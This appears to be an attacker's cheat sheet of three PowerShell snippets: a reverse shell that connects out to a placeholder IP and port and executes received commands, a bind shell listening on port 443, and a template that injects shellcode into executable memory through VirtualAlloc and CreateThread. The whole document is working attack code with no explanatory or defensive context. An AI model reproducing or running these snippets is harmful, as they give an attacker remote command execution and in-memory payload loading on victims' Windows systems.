#Powershell Reverse Shell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close()" 

#Powershell Bind Shell:
powershell –c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($I = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object –TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $I);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()" 

#Mem injection Temp
$code = ' 
[DllImport("kernel32.dll")] 
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); 

[DllImport("kernel32.dll")] 
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); 

[DllImport("msvcrt.dll")] 
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
    Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
    
[Byte[]]; 
[Byte[]]$sc = <place your shellcode here>; 
$size = 0x1000; 
if ($sc.Length -gt 0x1000) {$size = $sc.Length}; 
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40); 
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)}; 
$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 }; 
